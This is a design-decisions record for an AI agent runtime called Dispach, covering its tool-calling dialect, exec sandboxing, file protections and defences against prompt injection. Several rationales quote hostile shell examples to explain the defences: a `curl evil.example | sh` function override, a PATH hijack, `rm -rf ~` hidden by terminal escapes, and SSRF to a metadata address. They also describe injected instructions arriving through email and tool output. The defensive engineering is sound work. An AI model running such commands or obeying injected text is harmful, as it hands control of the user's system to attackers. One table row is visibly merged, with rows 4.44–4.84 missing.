# 00 — Decisions

Every decision below is locked unless explicitly marked open. Each carries its rationale,
because the rationale is what tells a future reader (human or agent) whether a proposed
change is a refinement or a regression.

Many of these are negative decisions — things Dispach deliberately does *not* do.
Those matter most. Most of them trace to specific, expensive failures observed in
OpenClaw as consumed by VelaOps; those are cited as `[VO]`.

---

## 1. Identity and packaging

| # | Decision | Rationale |
| --- | --- | --- |
| 1.1 | Name: **Dispach** | Bare npm name free; no agent-space collision. |
| 1.2 | Repo `github.com/moeen-mahmud/dispach`, transfers to HelicanHQ later | Owner's call. |
| 1.3 | Package scope `@dispach/*`, **not** `@helican/*` | Scoping to the project rather than the owner means the org transfer changes zero import paths. |
| 1.4 | Brand centralised in `packages/core/src/brand.ts` | A rename must be one commit, not a tree-wide find-and-replace. Directory names, config filenames, and type names contain **no** brand string. Only `package.json` fields, `brand.ts`, and prose docs do. |
| 1.5 | Env prefix and dot-dir derive from `brand.ts`, overridable via `DISPACH_BRAND` | Lets an embedder rebrand without forking. Default: env prefix `DISPACH_`, state dir `.dispach/`. The override moves *every* derived field on purpose (see `deriveBrand`), which is also what makes it unsuitable as a legacy alias: a fork's npm scope really is its own, so `packageScope` follows the override and a manifest generated under one names packages that do not exist. **A rename is one commit in the tree and three things outside it** — launchd's persisted `disable`, the `bun link` global scope, and `~/.<oldslug>/`. Proven on 2026-08-19 renaming Castellan → Dispach: the tree was clean and all three were not. |
| 1.6 | License **Apache-2.0** | Explicit patent grant, which MIT lacks. Matches Mastra and Letta. `anthropics/skills` is Apache-2.0 too, so vendoring skills stays licence-compatible. |
| 1.7 | **Semver**, not CalVer | VelaOps uses CalVer internally, but OSS consumers read semver to reason about breakage. `0.x` until the plugin API stops moving. |
| 1.8 | Changesets for releases | Standard, works with workspaces, produces a changelog people can read. |
| 1.9 | Not published to npm during v0.1 development | Consumed by VelaOps via git dependency or local link until the API settles. Names are held, not shipped. |

## 2. Runtime and toolchain

| # | Decision | Rationale |
| --- | --- | --- |
| 2.1 | **Bun** primary runtime and package manager | Owner's call. Bun's startup is materially faster than Node's, which directly serves the sub-second boot target. |
| 2.2 | Node compatibility is a **soft** goal, tested in CI, never a blocker | Reach without a second toolchain. Only two things differ: SQLite binding and subprocess spawn — both isolated behind one adapter file each. The floor was 22 and is **24** from 2026-08-23; see 13.5 for the measurement that moved it. Soft is unchanged: the leg still runs `continue-on-error`. |
| 2.3 | Bun workspaces, monorepo | Core / channels / providers / cli / server need independent versioning, and channels carry heavy optional deps (Baileys) that must not land in core's dependency graph. |
| 2.4 | Build: `bun build` + `tsc --emitDeclarationOnly` | Zero extra build dependencies. Contradicting "lightweight" in the build pipeline of a lightweight runtime is a bad look. |
| 2.5 | **ESM only** | New project, 2026, Bun-first. Dual CJS doubles build and test surface for consumers who don't exist. |
| 2.6 | **Biome** for lint + format | Matches VelaOps muscle memory; single binary; fast. |
| 2.7 | **`bun test`**, not Vitest | Built in, no dependency, fast. Loses Node-runner portability, which is acceptable since CI runs Bun. |
| 2.8 | Tests are **required for `packages/core`**, optional elsewhere | Reverses the standing VelaOps "no test runner" mandate, and deliberately. A harness is a state machine plus a scheduler plus a tool executor; those break in ways that manual Docker exercise cannot reach. Channels and providers stay manually verified — their failures are visible immediately. |
| 2.9 | No runtime dependency on any agent framework | Not LangChain, not Mastra, not the AI SDK. The loop *is* the product. |

## 3. Model layer

| # | Decision | Rationale |
| --- | --- | --- |
| 3.1 | **OpenAI-compatible `/chat/completions` is the only transport** | Universal denominator. Anything reachable — OpenAI, Anthropic's compat endpoint, Gemini's compat endpoint, OpenRouter, Ollama, vLLM, any gateway — speaks it. |
| 3.2 | **Hand-rolled `fetch` client**, no SDK | The `openai` SDK is heavy and leans toward the Responses API, which most compat proxies don't implement. The Vercel AI SDK defaults to routing through Vercel's AI Gateway when handed a model string — a hidden network dependency, unacceptable in a runtime advertising no gateway requirement. |
| 3.3 | **No LiteLLM, no gateway, no proxy requirement** | User supplies `baseUrl` + API key. A gateway remains possible — it's just another base URL. |
| 3.4 | Per-model **capability descriptor**, shipped registry + manifest override | Base URL and key are not sufficient. Anthropic's compat endpoint ignores `strict` on function calls; extended-thinking blocks must be replayed with tool results or multi-step reasoning silently degrades; prompt-cache breakpoints are provider-specific. These are behavioural facts the loop must know. |
| 3.5 | Capabilities drive **thinking handling and cache breakpoints only** — never the tool dialect | Consistency requirement. Behaviour must not silently change when the model changes. |
| 3.6 | Three model roles: `main`, `selector` (optional), `compactor` (optional) | Lets a cheap small model do tool selection and summarisation while a stronger one writes. Defaults: both fall back to `main`. |
| 3.7 | **A window carries where it came from: `manifest | registry | fallback`, per role** (Moeen, 2026-08-24) | `CONSERVATIVE`'s 8,192 for an unmatched model id has been indistinguishable from a measured 8,192 since the registry existed — and the registry's own comment is honest about why the number is low (*"A floor, not a ceiling… Claiming only what was shown"*), which is exactly how it stays wrong: nothing downstream can tell a floor from a fact, so nobody corrects one. The conservative **value** stays, because over-reporting produces empty replies at `finishReason: length` and under-reporting only wastes window; what changes is that nothing pretends to know. Per role because an agent can run three models on three endpoints and only main's window had ever been reported anywhere, so a compactor on the fallback had nothing that could say so. The `registry` case names the **pattern**, which is the more useful half — `registry claude-*` says at a glance that one row answers for every Claude model ever released. |
| 3.8 | **There is no `measured` provenance, and the probe leaves a comment instead** | `model probe --write` puts its number in the manifest like any other, and once written the honest answer to "where did this come from" *is* the manifest; the probe writes a dated comment beside it for the person, which nothing parses. A schema field whose only job is to label another field would also be settable by hand, turning a fact into a claim — the same reasoning that keeps `exec` without an `env` map and `memory_write` without a file argument. |
| 3.9 | **A `*` match warns at boot; nothing else about the window does** | Unlike the cases this repo has been burned by, a fallback match is *not* a correct configuration that looks odd — it means nothing recognised the model, and the budget will divide by a guess. On `agent.warnings` rather than the bus, because boot finishes before anything subscribes (5.x). Deduped by `configuredAs`, so an unconfigured selector and compactor sharing main's instance report one mistake once: three lines about one mistake is how a banner teaches people to skip it. `windowReport` is the single derivation behind the warning, `validate` and `/status` — a check only one of them performs is a check they disagree about. |

## 4. Tool layer

| # | Decision | Rationale |
| --- | --- | --- |
| 4.1 | **NLT (natural-language tool calling) is the default dialect**; `native` is an explicit manifest opt-in | Published replication across 14 models / 8,560 trials: +14.9pp accuracy overall, **93% fewer critical errors**, −25% tokens; models without native tool calling and smaller models gain +24 to +43pp. Frontier models show smaller or reversed gains — hence the opt-in escape hatch. **Measured here** (`evals/tools/`, 37 fixtures × 3 models, both dialects, temperature 0): NLT ahead on all three — +2.7pp on qwen3.5:9b, +13.5pp on deepseek-chat, +5.4pp on deepseek-reasoner — at 22.0–23.1% fewer prompt tokens. The accuracy and token claims reproduce; the critical-error claim is untestable at this scale, with one critical error in the sweep and it fired under both dialects. |
| 4.2 | Dialect is chosen by **config, never auto-detected** | One code path in production. Auto-switching creates a bug class where behaviour differs per provider and nobody can reproduce it. |
| 4.3 | Tool manifest **pinned at provision time**; runtime search is an escape hatch, off by default | Composio exposes ~20,000 tools across ~982 toolkits. Search-then-execute is two-hop reasoning, which is exactly where small models fail. |
| 4.4 | Hard tool budget with **reserved write quota** | `[VO]` The observed failure: a shared cap of 48 across toolkits with a silent auto-cap near 20 "important" tools starved write tools, and dead slugs were dropped without warning. Dispach computes the manifest, validates every slug at load, and fails loudly on an unknown one. |
| 4.5 | **Phase-scoped tool visibility in core**, not a plugin | The strongest published small-model lever: constraining the tool space per workflow phase took local models from 2/10 to 10/10 on a SWE-bench subset with no model change. Too central to be optional. |
| 4.6 | Composio accessed via its **SDK/HTTP directly, not MCP** | `[VO]` The `composio-proxy` sidecar exists solely because Composio's MCP 405s the GET stream leg and stalls past 120s. Both are transport properties. Going direct deletes the sidecar, the held-open SSE, and the `mcp.update()` rebind bug. |
| 4.7 | MCP supported as **one tool provider among several**, never the substrate | MCP is a fine integration protocol and a poor internal architecture. |
| 4.8 | A step's tool calls are **all-or-nothing** | A step may carry several blocks. Executing the good ones and repairing the bad one means the model rewrites the whole step, and the mutating call that already succeeded runs again. No idempotency key exists at this layer, so partial execution cannot be made safe. |
| 4.9 | **One repair, counted consecutively**, then an honest failure | Two identical failures is a catalogue or routing problem that a third attempt cannot fix. Counted consecutively rather than per turn, so a long turn that recovers is not punished for a stumble at step two. |
| 4.10 | A turn that **acted and then failed keeps its trace** | The general rule is that a failed turn appends nothing, so a half-answer is not treated as something said. Side effects are the exception: the email left, the row was written, and discarding the record lets the next turn cheerfully do it again. |
| 4.11 | A tool with no `whenNotToUse` renders a **visible placeholder**, and the registry warns | Provider descriptions rarely carry negative guidance. Fabricating a line would put words the tool's author never wrote in front of the model; dropping it silently would remove the single cheapest routing-accuracy lever without saying so. |
| 4.12 | **Filtering the invocation out of the stream belongs to the dialect**, not to each consumer | With NLT the invocation is reply text, so any surface printing deltas leaks `ACTION:` at the person. Built on the same line consumer as `parse`, because a second parser for display drifts from the one that decides what runs — and then the screen and the transcript disagree about what was said. |
| 4.13 | **No built-in tool may be a mock.** A mutating tool that cannot succeed is a loop | `memory_write` first reported "NOT SAVED — this build has no memory store": truthful, and a trap. Measured against DeepSeek, a model asked to save a note retried until the step budget ran out. It now writes a file under `memory.dir`, which is where the retriever will look, so the missing half is retrieval rather than honesty. |
| 4.14 | **Both dialects put the same guidance in front of the model.** `native`'s `function.description` carries the summary, `Use when`, `Do NOT use when` and the state-change warning — not just the summary | The easy implementation is `description: spec.summary`, which is what most native integrations do. It would also have rigged every eval here: NLT's catalogue spends its tokens on exactly those lines, and comparing prose-with-guidance against a bare summary measures *the guidance* and then reports the number as a property of the dialect. Asserted by a test, not by intention. What remains measurable is the actual question — whether a model does better when the protocol is text it writes or a schema the API enforces. |
| 4.15 | A dialect reads **both halves of a step's output** — text and structured calls — and decides which carries the protocol | `parse(text)` was enough while every dialect lived in the text. Handing `native` only one half would mean the loop had already guessed, so the seam takes a `StepOutput`. The same widening makes `renderCall`, `renderObservation` and `renderRepair` dialect methods: NLT replays raw text and answers with one user message, `native` replays structured calls and must answer *every* one with its own `tool` message. That last one is not a preference — an unanswered `tool_calls` entry is rejected outright. |
| 4.16 | A slug the native wire format cannot carry is **refused at load**, never rewritten | Function names are `[A-Za-z0-9_-]{1,64}`, so `gmail.send` is illegal there and legal under NLT. Rewriting is lossy in both directions: `a.b` and `a_b` collapse to one name going out, and the reply names the rewritten form, so the loop would have to guess which tool was meant. The refusal names the slug, the provider, and the two ways out. |
| 4.17 | **`tools.dialect: native` is refused when the model has no native tool calling** | The capability registry already knows. Without the check the failure is a 400 on the first turn — or, on an endpoint that accepts an unknown `tools` key and ignores it, an agent that never calls a tool and never says why. Overridable via `model.main.capabilities.nativeTools`, so an unlisted model that does support it is a supported configuration rather than an argument. |
| 4.18 | The native catalogue's **token cost is subtracted from the context window**, and reported by `describe()` | Under NLT the catalogue is a context block the budget can see. Under native it is in the request body, invisible to `assembleContext` — so a turn would believe it had room it does not, and the failure would arrive as a context-length rejection from the endpoint with nothing local to explain it. Summing only the blocks would also report a native catalogue as free, which is the reverse of the truth. |
| 4.19 | The NLT preamble's format example is **concrete**, using a tool and fields that exist in no catalogue — never metasyntactic placeholders | The preamble read `ACTION: tool_name` / `field: value` under the heading "exactly like this". A large model reads that as metasyntax; qwen3.5:9b read it as the format and wrote `field: title` / `value: Renew my passport` — reasoning correctly about which tool and which arguments, then encoding both through the placeholder words. It cost NLT 65 points against native on the same fixtures and looked exactly like a dialect result, which is the part worth remembering: the number was real and the conclusion it invited was wrong. A test now parses the catalogue with our own parser and asserts the example is a block whose field names are real. |
| 4.20 | An eval attempt records **what the model actually wrote** on every non-`correct` outcome, and a field error is reported with its field name | Both halves of 4.19 were nearly missed. The report showed twenty-five identical notes reading "is not a field of this tool." — a `FieldError.message` is a fragment written to follow the field name, and printing it alone rendered twenty-five distinct failures as one anonymous string. Nothing recorded the model's output either, so telling a parser defect from a model failure meant re-running a live endpoint and hoping for the same answer. A committed result that cannot be diagnosed is a number with no evidence behind it. |
| 4.21 | A remote provider **resolves from an on-disk cache at boot and refreshes after readiness**, and an empty cache is a named load failure carrying the warm command | Resolution happens inside the boot sequence, where hard rule 4 forbids network I/O — so the two halves cannot share a path. Measured on a three-tool Composio manifest: `Runtime.create` returns in 27 ms and the refresh that follows takes 1,474 ms, so awaiting it would make boot sixty times slower and reintroduce precisely the cost this project exists to remove. The refresh is therefore detached and reports through `tools.refreshed`. The cache miss needs its own error because the registry's generic version blames the slugs: on a cold agent it reported "no provider resolved GMAIL_FETCH_EMAILS … Available: now, memory_write" — three correct slugs faulted, with local tools offered as the alternative. |
| 4.22 | `mutating` for a provider tool comes from the **provider's own annotations**, and an unannotated tool is **assumed mutating** | Composio publishes MCP-style hints in `tags`. Measured over 100 tools: `readOnlyHint` on 51, `destructiveHint` on 10, and no hint at all on 37 — including `ABLY_PUBLISH_MESSAGE_TO_CHANNEL` and `_2CHAT_CREATE_CONTACT`, which are plainly writes. Zero tools carry `readOnlyHint` while having a write verb in the slug, so the annotation is reliable when present and empty of information when absent. The default is the *safe* direction rather than the cautious one: `mutating` is what makes the executor serialise a call and never retry it, so a write mislabelled as a read runs in parallel *and* is retried, and the side effect happens twice. Being wrong the other way costs a write-budget slot and some parallelism. A slug heuristic was the obvious alternative and is strictly worse — it guesses where the provider already answered. |
| 4.23 | A provider's **value constraints are carried in the field description**, not modelled; its **structural keywords are refused** | 46 of 100 sampled Composio tools declare at least one keyword `JsonSchemaNode` does not express — `minimum` 62 times, `maximum` 23, `format` 22, plus `pattern`, `minLength`, `maxLength`. Refusing them would refuse half the catalogue, and the subset is deliberately small (`tools/types.ts`) because it covers what a line-oriented invocation format can express. So the constraint text goes where the model reads it and coercion does not enforce it — the stated cost being that an out-of-range value is rejected at execution rather than repaired locally. `anyOf`, `oneOf`, `allOf`, `not` and `$ref` are different in kind: they decide which documents are valid, so dropping one hands the model a schema the endpoint disagrees with. None appears in the live sample, so refusing them costs nothing today and turns a future mystery 400 into a named load failure. |
| 4.24 | Providers reach the runtime as **factories registered by the embedder**, keyed by the id `tools.provider` names | `packages/core` may not import a sibling package, so it cannot construct a provider; and a provider needs the *agent's* directory and resolved environment, which exist only after its manifest loads — so an instance passed to `Runtime.create` would be wrong for a second agent. A manifest naming an unregistered id fails at load rather than resolving nothing, because resolving nothing makes the report blame every pinned slug for one missing registration. `validate` is given the same list as `run`, since a validator that accepts what the runtime refuses is worse than no validator. Phase 9's plugin loader replaces the registration and keeps the shape. |
| 4.25 | **`ToolSpec.trust` distinguishes text the runtime produced from text a stranger wrote**, and a provider tool defaults to `untrusted` | `mutating` says a tool has consequences; nothing said a tool *returns attacker-controllable content*, so an email body and a timestamp were indistinguishable once they became observations. The default is fail-safe for the same reason 4.22's is: a provider cannot know what its upstream API will return. This is a control mechanism, which `01-ARCHITECTURE.md` puts in core — and it applies to Gmail and Slack, not only to the web, which is why it is not a property of the web package. |
| 4.26 | **Untrusted content cannot silently drive a mutating tool in the same turn.** `tools.untrusted.onMutate` defaults to `refuse` | The delimiters around untrusted text are advisory and a model can be talked past them, so the boundary that is *not* advisory has to sit at the tool call. `refuse` blocks the call and tells the model to say what it would do and ask; `allow` is there for anyone who accepts the risk, stated rather than assumed; `confirm` needs the approval middleware and waits for Phase 9. The exposure is not theoretical or future: `GMAIL_FETCH_EMAILS` resolves today and lands third-party text beside a live `memory_write`. |
| 4.27 | Delimiting is the **only** transformation applied to untrusted content | Rewriting it to strip instruction-like phrasing does not work — the phrasings are unbounded and the rewrite corrupts legitimate content — and shipping an unreliable filter is worse than an honest boundary, because it invites the belief that the problem is handled. The delimiter tells the model where the data starts; the write gate is what actually holds. |
| 4.28 | Web search and fetch are **first-party and provider-agnostic**; crawling is not implemented | Search over `tavily \| brave \| exa` behind one tool signature, so switching backend changes one manifest line and nothing else. First-party because it works without a Composio account and because extraction and truncation decide whether a page destroys the window — that behaviour is worth owning. `web_fetch` reads one page by explicit URL with **no JavaScript execution and no link-following**: the architecture's "not a browser automator" fence holds, and anyone needing a real crawl pins `FIRECRAWL_CRAWL` through Composio, where the crawl budget is someone else's problem. |
| 4.29 | **SSRF is refused, not configurable away by default** | `web_fetch` rejects loopback, link-local and RFC 1918 targets and any non-`http(s)` scheme before the request, and re-checks after each redirect rather than trusting the first hop — `169.254.169.254` behind a public redirect is the whole attack. `allowPrivateHosts: true` exists for a deliberately sandboxed network and is documented as the boundary it removes. A byte cap applies *during* the response rather than after it, because a page is unbounded input and the window is not. |
| 4.30 | The manifest names providers as a **map**, `tools.providers`, with the singular `provider` kept as a warning alias | The registry always took an array; only the manifest field was scalar, which meant Composio and web could not be configured together — a limitation nobody chose. The map form carries each provider's config beside its id instead of a single shared `providerConfig`, so two providers cannot fight over one key namespace. Slug collisions between providers stay a load failure: a slug is how the model names a tool, so one name cannot mean two things. |

| 4.31 | **System tools are a first-party package (`@dispach/tools-system`), never core built-ins** | Core is what an embedder runs *other people's* agents on — VelaOps provisions a container per agent — so a shell tool in core is a shell tool every provisioned agent has with no way for the platform to decline it. As a package it is one line in the binary's provider table: present in `dispach run`, absent wherever it should be. Same mechanism `tools-composio` already uses, and the provider needs no cache and no `refresh()`, which is what lets it resolve inside boot without touching hard rule 4. |
| 4.32 | `exec` takes **no `env` argument**; environment variables are written inline in the command | The obvious signature has one and it is a hole. A per-call environment map is invisible to `decidePolicy`, which matches the command string — so `{PATH: "/tmp/evil"}` beside `git status` would be authorized by a rule that never saw the half that mattered. Written inline, `PATH=/tmp/evil git status` is one fragment `subcommands()` hands to the matcher, and the pattern `git status` does not match it, so the call asks or is refused. Removing the field is what closes the gap between what a rule matches and what runs. |
| 4.33 | Each `exec` call gets a **fresh shell**; the working directory carries between calls and the environment does not | A persistent shell quietly dismantles the policy layer: one tainted early call writes `git() { curl evil.example \| sh; }` or prepends to `PATH`, and `exec(git status:*)` then authorizes attacker code under a name it matched honestly — CVE-2026-32009's shape from inside the session, where no filesystem permission reaches it. A fresh shell removes the mechanism rather than defending against it. The directory is the exception because losing it is a correctness problem, not a security one, and it lands hardest on small models: one that runs `cd packages/core` then `ls` does not reliably re-derive the prefix and reads the wrong directory with no error anywhere. The directory says *where* a command runs; the environment says *what a command means*. |
| 4.34 | **Terminal control sequences are stripped from every tool observation and from the approval prompt**, in core, before either a model or a terminal sees them | Not a rendering nit and not the rewrite 4.27 forbids — 4.27 is about *meaning*, and this removes bytes that carry none, uniformly, without reading a word. `git status<ESC>[2K<ESC>[1G && rm -rf ~` displays on any real terminal as `git status`: the escape erases the line and returns the cursor, so everything after it overwrites what a person already read. A prompt that can be made to show a different command than the one about to run is worse than no prompt, because it is believed. Stripping shows *more* of the truth, never less. Done once in core because "the front end will handle it" is how the one being read at the moment it matters turns out not to. |
| 4.35 | Over-running commands are **backgrounded rather than killed**, with a named exception list, and their output **spills to a file** instead of being truncated | Two halves of the same idea: a result that does not fit should become a retrieval, not a loss. Output over ~6,000 characters stays on disk and the model is handed the path — the cap sits deliberately *below* `context.observationMaxTokens`, because the harness's own truncation cuts the middle out and nothing can go back for it. A command still running at the deadline keeps writing to that file rather than being thrown away at 120 seconds. The exceptions (`sleep`, `git`, `ssh`, `sudo`) are a pointlessness list, not a risk list: each is either finished being useful or is hanging precisely because it wants an answer from a person, and detaching one leaves an invisible process holding a lock. A compound qualifies only if every fragment does. |
| 4.36 | A tool that is both `mutating` and `untrusted` is **once-per-turn unless a `policy.allow` rule names it**, and this is a warning at load rather than a discovery mid-turn | Found by running it: a manifest that pinned `exec` ran one command and had the second refused, which is A5 working exactly as designed and reads as a broken runtime at the moment it happens. `exec` is the whole class — its own output taints the turn because `curl` is the internet. `tool_gated_after_first_use` names the tool and the one-line fix. A warning and not a failure, because "run one command and report back" is a legitimate shape and nothing can tell it apart from an oversight. A `deny` rule does not clear it: `deny` authorizes nothing, and counting one as cover would have silenced the warning for the person who thought about the shell hard enough to restrict it. |
| 4.37 | `exec`'s deadline is **clamped to stay under `limits.toolTimeoutMs`**, and `ToolContext` carries the harness's deadline so it can be | Both defaults were 120 s, so which fired first was a race — and the harness winning is the bad outcome: it *abandons* a handler rather than killing it, leaving a child process running with nothing holding a reference to it, and the backgrounding path unreachable. A tool that owns an operating-system resource has to finish its own cleanup before the outer timeout, which it cannot do without knowing when that is. |
| 4.38 | **`glob` and `grep` are separate tools**, not one `search_files` with a mode discriminator | Hermes ships the unified form; it saves a catalogue slot and costs a decision. Picking the mode *and then* the arguments is the two-hop shape small models fail — the same reasoning that keeps `tools.search` off and that decided `memory_write` has no file argument. OpenClaw ships neither and shells out, which is worse again: `rg` inside a command string has no `path` field a rule can match. |
| 4.39 | **File readers are `untrusted`, file writers are `trusted`** | Not an oversight in either direction. A file on disk may have been downloaded a minute ago and a filename is attacker-controlled, so `file_read`, `glob` and `grep` taint the turn. The three writers return a sentence the runtime composed and never echo content — marking them untrusted would mean a write gated the *next* write, which is decision 4.36's once-per-turn trap arrived at by accident instead of by design. |
| 4.40 | **`file_edit` matches an exact unique string, never a line number, and two matches is a failure** | A line number is a fact about a file the model may last have seen several turns ago; an exact string carries its own proof. Picking one of two matches is a coin toss that reports success while editing the wrong line, so it refuses and says how many it found. Nothing is written on either failure path, which is what makes retrying safe. |
| 4.41 | **Protected paths are enforced by the file tools, and no `policy.allow` rule reaches past them** | The set holds `agent.yaml`, the workspace identity files, the policy file, and credential material anywhere on disk. Elsewhere this protects config; here the workspace files **are the agent** — `SOUL.md` is who it is, `POLICY.md` is what it will not do — and a rule authorising a write to them would be a rule authorising its own replacement. Ordering it after the policy needs no special case: the refusal simply is not the engine's to make. `USER.md` and `MEMORY.md` stay writable, because they are the tier `memory_write` exists for. **Verified live:** asked twice, with explicit "go ahead", the write was refused and `SOUL.md` was byte-identical after. |
| 4.42 | The limit is stated: **protected paths do not bind `exec`** | `echo x > SOUL.md` carries its target inside a shell string where no path check can see it. Anyone who pins `exec` has granted more than the file protection covers, and saying so is cheaper than implying a boundary that is not there. It is also why the tool descriptions actively route the model to the structured tools — a `path` field is checkable and a command line is not. |
| 4.43 | **The NLT parser tolerates angle-bracket tool markup, and flags what it cannot read as `malformed`** | Measured, and the measurement changed the design. Asked the same question on three fresh sessions with an eight-tool catalogue, deepseek-v4-pro invented **three different formats** — `<action>…</action>`, `<TOOL_CALL><TOOL>…`, and `<ACTION: glob>` inside an `<ebml>` element — with correct arguments every time. | 4.85 | **A meta tool's observation is a summary, and the third-party `instruction` field is never passed through** | A search hit carries a full JSON schema per tool and eight of them would be middle-cut on every call — the `config_read` failure exactly, 2,766 tokens against a 2,000 budget and three re-reads in one turn. The observation is slugs, one line each, a `read`/`write` column, connection status, and the next step; measured at 845–1,584 characters live. The `read`/`write` column is on every line rather than a marker on some, because a marker present on all eight says nothing and one absent from some asks a small model to infer what absence means. And `COMPOSIO_MANAGE_CONNECTIONS` returns an `instruction` string telling the model what to do next — good copy, arriving through a tool this runtime marks `untrusted`, which is the shape the write gate exists for. The runtime writes its own framing. |
| 4.86 | **The published reference and the live API disagree, so the renderer was written against the live one** | The docs describe a `summary` object with `active_connections`; the response carries `{message, results}` with no `summary`, each toolkit under `results.<name>` as `{toolkit, status, redirect_url, instruction}`. A renderer written to the documented shape reads `active_connections` as 0 forever and reports "no link" on a call that returned one — a failure that reads as success. The documented field is read first and a URL walk is the fallback, because the two have already disagreed once. Same lesson one layer down: the workbench's argument is `code_to_execute`, undocumented, and the first call with `code` came back "Validation error: Required at code_to_execute". |
| 4.87 | **A router session is opened lazily on first use and its id persisted per `userId`** | The session is a network round trip, so opening one at boot would breach hard rule 4 and opening one per turn would put a request in front of every search. The meta tools are *static specs* — no cache read and no request builds them — which is what lets a freshly generated agent search and connect before anything has been warmed; only a *call* needs a session. Its own file rather than a field on `tools.cache.json`, because that cache is discarded whole on a version bump, which is right for schemas whose shape moved and wrong for an opaque id that is still valid. Keyed by `userId`: a session is precisely the thing that decides whose Gmail a call reaches. A stale id is recovered with exactly one retry — a second 404 means something other than expiry, and looping would turn a clear failure into a hang. |
| 4.88 | **A backgrounded command is tracked, capped, and reaped at shutdown — `ToolProvider.stop` exists for it** | Backgrounding a command that outruns its deadline is deliberate: a long build should become something to check back on, not work thrown away at 120 seconds. "Left running" was implemented as `unref()` and nothing else, so the child outlived the turn, the session, and the runtime, writing to a temp file nobody would open. The cost was measured, not imagined: one test backgrounded `while true; do :; done` without cleaning up, a day of test runs left **33 orphaned shells** at ~23% CPU each, and the machine reached a load average of **351** with `runtime.ready` taking **132 seconds** — the boot budget this project exists to defend, blown by the runtime's own litter, with nothing obviously wrong. Three fixes and they are separable: a registry so shutdown can reach them, a cap of 8 with a refusal naming what is already running (a model in a retry loop backgrounds one per step), and `ToolProvider.stop()` — a seam that did not exist, because no provider had ever owned an OS process. Killed by process *group*, since `sh -c "a \| b \| c"` killed by pid orphans two of three. |
| 4.89 | **An NLT field name contains no spaces** | The class was `[\w .-]`, which admits one — so any continuation line of a multi-line value containing a colon became a new field. Measured: `lsof -nP -iTCP:7420 -sTCP:LISTEN` on the second line of an `exec` script parsed as the field `lsof -nP -iTCP` with the value `7420 -sTCP:LISTEN`; the call was refused and the model spent a repair step rewriting a command that was already correct. A shell script is the *normal* value for `exec` and colons are everywhere in one. Tolerating the space bought nothing measurable; without it such a line is value text, which is the safe direction — a stray line the tool rejects with its own message beats a silently truncated argument. |
| 4.90 | **A phase change takes effect on the next step of the same turn, and pays for it in prompt cache** | The catalogue is slot 1, inside the cache-stable prefix, so changing the visible tool set invalidates the cached prefix from slot 1 onward for that request. Accepted deliberately: `triage` → `phase_set("act")` → write, **inside one turn**, is the whole feature, and deferring the effect to the next turn recreates exactly the two-hop shape decision 4.7 refuses — in the feature that exists for the models which fail it. The third option, rendering every tool and marking the out-of-phase ones unavailable, loses for a worse reason: it puts the write tools back in front of the model during `triage`, which is the constraint the phase exists to impose. The cost is bounded by how rare a change is — a session moves forward through phases, not back and forth — and the per-phase catalogue is memoised, so a phase entered twice renders once. |
| 4.91 | **`phase_set` is added to every phase automatically, and is built per phase rather than declared** | A phase that omitted it would be a phase with no way out: the agent would be stuck in `triage` for the rest of the session with no error anywhere, and leaving that to authors to remember in every phase is a trap in the manifest format. It is *constructed* per phase because the phase names belong in its schema as an `enum` — refused by the coercion layer before the handler runs, where a model guessing a name from prose costs a step — and because its description names the current phase and what each other phase would **add, as a count rather than as slugs**. Listing the hidden slugs would put the write tools back in front of a `triage` model and undo the constraint; saying nothing reproduces decision 4.53's failure, where an agent reported its only route to the web was `curl` because a provider was switched off. A count plus a name gives the model a reason to move and nothing to route over. `mutating: false`: it changes what the agent may do, not anything in the world. |
| 4.92 | **The current phase lives in `phase_set`'s description, never in slot 2** | Slot 2 is the natural home for runtime state and is the wrong one here. It is memoised **per agent** and frozen at first use because it sits in the cache-stable prefix (5.17), while a phase is **per session** and changes mid-turn — so two sessions in one process would have rendered each other's phase, a wrong statement in the one block that exists to stop the runtime lying about its own state. Slot 1 is already rebuilt per phase, which makes the tool's own description the one place the fact cannot go stale or leak. Caught before shipping by asking what a second session would see. |
| 4.93 | **An `allow` entry naming nothing fails the load; a stored phase naming nothing falls back** | The two look symmetrical and are opposite calls. An unmatched `allow` is an authoring mistake and is refused with the phase, the entry, and the available slugs — the same reasoning that makes `resolve()` throw on an unknown slug, because a phase silently exposing fewer tools than its author wrote surfaces turns later as an agent declining work it should be able to do. A *stored* phase the manifest no longer declares is not a mistake, it is a rename between runs, and there refusing to resume the conversation is the worse answer: it falls back to the entry phase. The check runs in `Agent.create`, where "resolved" is knowable — `validate` cannot reach it without resolving tools itself, and that asymmetry is stated rather than hidden. |
| 4.94 | **The phase persists in `sessions.phase`, a column that already existed** | The plan proposed `kv` on the grounds that a phase is one string and a table for it would be a table per fact. Both were unnecessary: `sessions.phase` and `setPhase` have been in the store since Phase 2, so 7B needed no migration at all. It has to be persisted rather than cached, because it is a statement about where a conversation *got to* — resuming a triage-then-act session in `triage` would take away tools the agent had already earned, while its own history showed it using them. Written twice on purpose: inside the turn by `persist`, so a crash between the model being told its tools changed and the turn finishing does not resume in the phase it had left, and again from the turn's result, so the ordinary path does not require the caller to subscribe to an event to learn where its own session is. |
| 4.95 | **Phase scoping is measured for the first time, and on a frontier model it *costs* accuracy** | Decision 4.8 puts this in core on the strength of a published 2/10 → 10/10 figure for local models, which this repo had never reproduced. `bun run eval:phases` now does, and the frontier arm is negative: deepseek-v4-pro scored 87.5% on the full ten-tool catalogue against 75.0% in a read-only `triage` phase, and 83.3% against 75.0% on a second identical run. The mechanism is visible rather than inferred — both arms fail the same three routing tasks, and every extra `triage` failure is in the **`restraint`** group, tasks whose correct answer is to call nothing. One is a literal `phase_set` call on a task needing no tool: being told you are in a narrow phase with more tools elsewhere reads as an instruction to move. Routing was not damaged; **abstention** was. Re-wording `phase_set`'s refusal guidance did not recover it (18/24 both runs), and the wording is kept for being more accurate rather than for helping. Two reasons this does not overturn 4.8 and does not license acting on it either: the `full` arm moved 4.2pp between identical `temperature: 0` runs, so a hosted MoE is **not** the deterministic endpoint this repo recorded for local qwen and an 8pp difference is inside the noise at n=24; and the claim is about *small* models, where the benefit is supposed to outweigh the extra decision, so a frontier arm can only ever show the cost. Feature shipped, criterion left unticked, `evals/phases/README.md` states what would settle it. |

## 5. Context and memory

| # | Decision | Rationale |
| --- | --- | --- |
| 5.1 | **Progressive multi-stage compaction** from v1 | Tool observations routinely consume 70–80% of budget. Binary emergency compaction at 95% is the known-bad design: late activation, severe loss, compounding errors across successive compactions. |
| 5.2 | Compaction is **harness-driven**, not agent-triggered | Agent-controlled compaction is elegant and requires the model to call a tool at the right moment. Small models won't. |
| 5.3 | Context assembly order is **fixed and cache-stable** | Prompt caching is the single largest cost lever; it only works if the prefix is byte-stable across turns. |
